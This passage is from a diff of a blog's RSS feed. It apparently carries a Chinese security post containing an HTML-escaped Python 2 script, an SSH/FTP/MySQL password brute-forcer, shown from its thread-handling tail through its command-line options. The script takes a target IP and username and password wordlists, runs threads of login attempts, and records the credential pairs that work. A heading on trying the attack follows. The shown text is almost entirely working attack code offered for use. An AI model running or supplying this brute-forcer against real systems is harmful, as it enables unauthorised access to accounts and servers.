+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">3&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> OptionParser(usage&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Usage: python %prog [options] type&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-i&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--host&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;host&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;target ip&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-o&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--timeout&amp;#39;&lt;/span>,type&lt;span style="color:#f92672">=&lt;/span>int,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;timeout&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;timeout&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-t&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--thread&amp;#39;&lt;/span>,type&lt;span style="color:#f92672">=&lt;/span>int,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;threadnum&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;threadnum&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-L&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--userfile&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;userfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;username.txt&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;userfile&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-P&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--passfile&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;passfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;password.txt&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;passfile&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options, args) &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> args:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ssh&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh &lt;span style="color:#f92672">=&lt;/span> SshBruter(options, args)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>run()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ftp&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp &lt;span style="color:#f92672">=&lt;/span> FtpBruter(options, args)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>run()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;mysql&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mysql &lt;span style="color:#f92672">=&lt;/span> MysqlBruter(options, args)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mysql&lt;span style="color:#f92672">.&lt;/span>run()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;type must be ssh or ftp or mysql&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-尝试爆破">0x01 尝试爆破&lt;/h3>
+&lt;p>&lt;img src="https://wyb0.com/img/post/bruter_help.png" alt="帮助信息">&lt;/p></description></item></channel></rss>
